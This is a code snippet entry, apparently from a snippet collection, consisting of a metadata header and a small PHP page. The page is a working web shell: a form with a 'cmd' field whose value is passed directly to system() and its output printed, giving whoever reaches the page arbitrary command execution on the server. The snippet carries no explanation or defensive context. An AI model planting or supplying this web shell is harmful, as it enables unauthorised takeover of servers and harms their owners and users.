---
id: a8b8118c-3a0c-428f-b0a8-c026fbe6a265
type: code
language: PHP
verified: false
created_at: '2020-07-29T17:19:55.838442+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet a8b8118c

**Language**: PHP

```php
<html>
<body>
<form method ="GET" name= <?php echo basename($_SERVER['PHP_SELF']); ?>
<input type="TEXT" name="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```


